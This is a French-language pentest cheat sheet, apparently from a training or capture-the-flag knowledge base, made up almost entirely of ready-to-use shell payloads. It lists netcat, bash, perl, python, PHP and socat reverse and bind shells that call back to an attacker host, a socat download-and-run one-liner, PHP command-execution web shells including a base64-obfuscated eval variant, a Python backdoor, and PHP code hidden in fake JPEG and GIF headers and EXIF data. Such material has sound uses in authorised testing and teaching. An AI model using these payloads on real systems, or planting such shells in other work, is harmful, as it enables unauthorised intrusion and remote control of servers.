

<!--- category: Webshell --->
<!--- id: intro --->
<!--- title: Web Shell --->
<!--- keywords:  --->
## Web Shell

Lignes de code à injecter dans des pages web pour lancer des commandes shell.



<!--- category: Webshell --->
<!--- id: ncprinciple --->
<!--- title: Principe --->
<!--- keywords:  --->
## Principe

Vous avez trouvé une requête web qui permet d'executer des commandes sur le serveur, ou vous avez reussi à trouver comment uploader un fichier qui peut être exécuté.<br/>
Votre objectif maintenant est d'obtenir un shell sur la machine, ce qui permettra une exploitation confortable.<br/>
Vous allez utiliser les outils installés sur le serveur (netcat, bash, php, python, perl, ...) pour ouvrir un shell sur le serveur et le connecter à votre shell.



<!--- category: Webshell --->
<!--- id: nc --->
<!--- title: Netcat --->
<!--- keywords:  --->
## Netcat

Netcat, est le couteau suisse des connections entre serveurs.<br/>
Il peut se mettre en écoute, se connecter et lancer des shells.<br/>
<br/>
Les anciennes versions possédaient l'option -e ou -c qui permet de lancer un shell. Les version récentes ne possèdent plus cette option pour des raisons de sécurité<br/>
Sur Kali on trouve une version 1.10 en :
```
/usr/bin/nc -h
	-e shell commands : program to execute
	-c shell commands : program to execute
	-l                : listen mode
	-v                : verbose
	-p port           : local port number
```

Pour se connecter sur le port 3000 du serveur 10.0.0.11:
```
/usr/bin/nc 10.0.0.11 3000
```




<!--- category: Webshell --->
<!--- id: ncreverse --->
<!--- title: Netcat - Reverse Shell (-e version) --->
<!--- keywords:  --->
## Netcat - Reverse Shell (-e version)

Mettre un nc en écoute sur la kali
```
nc -lvp 4444
```

Lancer un reverse shell sur le serveur, qui lance un shell, vient se connecter sur le netcat en écoute, et donne accès au shell.
```
nc -e /bin/sh IPKALI 4444
```

Pour utiliser un reverse shell il faut connaitre l'IP publique de sa Kali.



<!--- category: Webshell --->
<!--- id: ncreversenoe --->
<!--- title: Netcat - Reverse Shell (sans -e) --->
<!--- keywords:  --->
## Netcat - Reverse Shell (sans -e)

Mettre un nc en écoute sur la kali
```
nc -lvp 4444
```

Lancer un reverse shell sur le serveur, qui lance un shell, vient se connecter sur le netcat en écoute, et donne accès au shell.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f
```




<!--- category: Webshell --->
<!--- id: ncupgrade --->
<!--- title: Upgrader son shell netcat avec un tty --->
<!--- keywords:  --->
## Upgrader son shell netcat avec un tty

Le shell obtenu avec nc est basique. Ce n'est pas un tty.<br/>
Certaines commandes comme su vont refuser de fonctionner.<br/>
Pour upgrader notre shell, utiliser python pour avoir un shell de type tty:
```
python -c 'import pty; pty.spawn(&quot/bin/bash&quot)'
```




<!--- category: Webshell --->
<!--- id: ncupgrade2 --->
<!--- title: Upgrader son shell avec historique et completion --->
<!--- keywords:  --->
## Upgrader son shell avec historique et completion

Le shell obtenu avec nc est basique. La completion avec le Tab, l'historique avec les flèches ne sont pas gérés.<br/>
<br/>
Passer le nc en arrière plan avec:
```
Ctr-Z
```

Puis demander au shell actuel de passer les codes des touches brutes au shell distant, et repasser sur le netcat (foreground)
```
stty raw -echo
fg
```

Attention: Tenter cette manip dans un browser va juste freezer le shell. Le browser modifie lui aussi les codes des touches. Ca ne marche que dans une VM.



<!--- category: Webshell --->
<!--- id: ncwebfriendly --->
<!--- title: Webshell copain friendly --->
<!--- keywords:  --->
## Webshell copain friendly

Tant que votre nc est connecté, vous bloquez un thread du serveur web.
En fonction de la configuration du serveur, il peut avoir 6, 16, 32 threads... Dont autant de nc en parallèles avant saturation.
Pour libérer le serveur pour les copains:
Dans le nc connecté, choisissez un second port et lancez un second bindshell netcat en arrière plan:
```
binshell: 
nohup bash -c 'while true; do nc -e /bin/bash -lvp 4445; done;' &

reverse shell: 
nohup bash -c 'bash -i >& /dev/tcp/IPKALI/4444 0>&1' &
```

La commande nohup va détacher le process nc du shell en cours.
Faites un Ctrl-C pour couper la connection nc, la page avec votre webshell se libère. Un autre utilisateur peut se connecter.
Lancer un nouveau nc pour vous connecter à ce nouveau bindshell.



<!--- category: Webshell --->
<!--- id: ncbind --->
<!--- title: Netcat - Bind shell --->
<!--- keywords:  --->
## Netcat - Bind shell

Un bind shell est utile quand notre Kali est derrière un NAT.
Ce shell est fragile, un scan de port va le déclencher et le fermer.
Lance un shell, ouvre une socket TCP en écoute sur le port 4444, et donne accès au shell au premier qui se connecte.
```
nc -e /bin/sh -lvp 4444
```

Se connecte au netcat distant pour avoir accès au shell.
```
nc iptarget 4444
```




<!--- category: Webshell --->
<!--- id: ncbindnoe --->
<!--- title: Netcat - Bind Shell (without -e option) --->
<!--- keywords:  --->
## Netcat - Bind Shell (without -e option)

Lancer un bind shell sur la cible
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc -lp 4444 >/tmp/f
```

Se connecter avec un nc 
```
nc victim 4444
```




<!--- category: Webshell --->
<!--- id: socat --->
<!--- title: Shell: Socat --->
<!--- keywords:  --->
## Shell: Socat

Socat est un nc sous stéroides. Il permet une authentification, un chiffrement des communications et un forward de ports.<br/>
On le trouve rarement sur les serveurs, il faut l'uploader.<br/>
Mettre un socat en écoute
```
socat file:`tty`,raw,echo=0 TCP-L:4444
```

Lancer un reverse shell avec un socat
```
$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
```

Automatiser l'upload et le reverse shell:
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```




<!--- category: Webshell --->
<!--- id: pwncat --->
<!--- title: Shell: Pwncat --->
<!--- keywords:  --->
## Shell: Pwncat

Pwncat est un nc sous stéroides. 
```
https://github.com/cytopia/pwncat
```




<!--- category: Webshell --->
<!--- id: bash --->
<!--- title: Reverse shell: Bash --->
<!--- keywords:  --->
## Reverse shell: Bash

Netcat et python ne sont pas installés sur le serveur. Il est toujours possible de lancer un reverse shell en bash.<br/>
Mettre un nc en écoute votre host:
```
nc -lvp 4444
```

Lancer le reverse shell à partir de votre cible:
```
bash -i >& /dev/tcp/IPKALI/4444 0>&1
```




<!--- category: Webshell --->
<!--- id: perl --->
<!--- title: Reverse shell: Perl --->
<!--- keywords:  --->
## Reverse shell: Perl

Mettre un nc en écoute sur la kali
```
nc -lvp 4444
```

```
perl -e 'use Socket;$i="IPKALI";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```




<!--- category: Webshell --->
<!--- id: python --->
<!--- title: Reverse shell: Python --->
<!--- keywords:  --->
## Reverse shell: Python

Mettre un nc en écoute sur la kali
```
nc -lvp 4444
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IPKALI,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(/bin/bash)'
```




<!--- category: Webshell --->
<!--- id: php --->
<!--- title: Reverse shell: Php --->
<!--- keywords:  --->
## Reverse shell: Php

Mettre un nc en écoute sur la kali
```
nc -lvp 4444
```

```
php -r '$sock=fsockopen("IPKALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```




<!--- category: Webshell --->
<!--- id: webphp --->
<!--- title: Web server: cmd.php --->
<!--- keywords:  --->
## Web server: cmd.php

Si vous pouvez uploader un fichier php sur le serveur web, le fichier ci-dessous vous permettra de lancer des commandes shell:
```
&lt?php echo 'Shell: ';system($_GET['cmd']); ?>
```

Lancer la commande 'id' sur le server
```
curl http://IPSERVER/cmd.php?cmd=id
```




<!--- category: Webshell --->
<!--- id: webphp22 --->
<!--- title: Web server: cmd.php (clean html) --->
<!--- keywords:  --->
## Web server: cmd.php (clean html)

Uploader la page
```
&ltpre>&lt?php echo 'Shell: ';system($_GET['cmd']); ?>&lt/pre>
```

Lancer la commande 'id' sur le server
```
curl http://IPSERVER/cmd.php?cmd=id
```




<!--- category: Webshell --->
<!--- id: webphpbase64 --->
<!--- title: Web server: PHP encodage base64 --->
<!--- keywords:  --->
## Web server: PHP encodage base64

Parfois certain caractères comme les ; les & ou les | sont filtrés. Un encodage base64 permet de s'en sortir.<br/>
Dans un shell encoder en base64:
```
$ printf 'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f");' | base64
```

Code PHP du reverse shell
```
eval(base64_decode('c3lzdGVtKCJyEtxxxxxxxxxEkgNDQ0NCA+L3RtcC9mIik7='));
```




<!--- category: Webshell --->
<!--- id: pythonbind --->
<!--- title: Python bind shell --->
<!--- keywords:  --->
## Python bind shell

```
import sys,socket,time,re,subprocess,os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
sock.bind(('0.0.0.0',4444))
sock.listen(5)
conn,addr = sock.accept()
conn.send('== YOLO Backdoor ==\n\n>')
while 1:         
    data = conn.recv(1024)
    cmd = data.strip().split(' ')
    if cmd[0] == 'cd':
        os.chdir(cmd[1])
    elif cmd[0] in ('exit'):
        break
    else:
        conn.send(subprocess.check_output(cmd)+'\n>') 
conn.close()
sock.shutdown(socket.SHUT_RDWR)
sock.close()
```




<!--- category: Webshell --->
<!--- id: imgwebshell --->
<!--- title: File upload Webshell : Jpeg --->
<!--- keywords:  --->
## File upload Webshell : Jpeg

Si vous pouvez upload un fichier jpg, il est possible d'y cacher un webshell.<br/>
Un fichier jpeg est identifié par ses premiers octets qui ont la valeur : ffd8ffe0  <br/>
Pour générer un fichier qui sera identifié comme ayant une entête Jpeg valide:
```
printf &quot;\xff\xd8\xff\xe0&lt?php system('id'); ?>&quot; > webshell.jpg
```

Ce fichier sera reconnu comme un fichier jpg
```
$ file webshell.jpg 
webshell.jpg: JPEG image data
```




<!--- category: Webshell --->
<!--- id: imgwebshell2 --->
<!--- title: File upload Webshell : Gif --->
<!--- keywords:  --->
## File upload Webshell : Gif

Un fichier gif est identifié par ses premiers octets qui ont la valeur : GIF89a;  <br/>
Pour générer un fichier qui sera identifié comme ayant une entête gif valide:<br/>
```
printf &quot;GIF89a;&lt?php system('id'); ?>&quot; > webshell.gif
```

Ce fichier sera reconnu comme un fichier gif
```
$ file webshell.gif 
webshell.gif: GIF image data
```




<!--- category: Webshell --->
<!--- id: imgwebshell --->
<!--- title: File upload Webshell : Exif datas --->
<!--- keywords:  --->
## File upload Webshell : Exif datas

Un fichier image contient de nombreuses informations : date de prise de vue, localisation, type d'appareil photo...<br/>
Nous pouvons injecter du code php dans ces données.
```
exiftool -Comment&equals;'&lt?php system('id'); ?>' webshell.jpg
```




<!--- category: Webshell --->
<!--- id: payloadallthethings --->
<!--- title: References: PayloadAllTheThings et PentestMonkey --->
<!--- keywords:  --->
## References: PayloadAllTheThings et PentestMonkey

A lire pour en savoir plus:<br/>
Liste de webshells
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```

Webshell en pure php: <a href=php-reverse-shell.php.txt>php-reverse-shell.php</a>
```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```

Yop Webshell: <a href=yopwebshell.php.txt>yopwebshell.php</a><br/>
Yolo Webshell: <a href=yolowebshell.php.txt>yolowebshell.php</a>

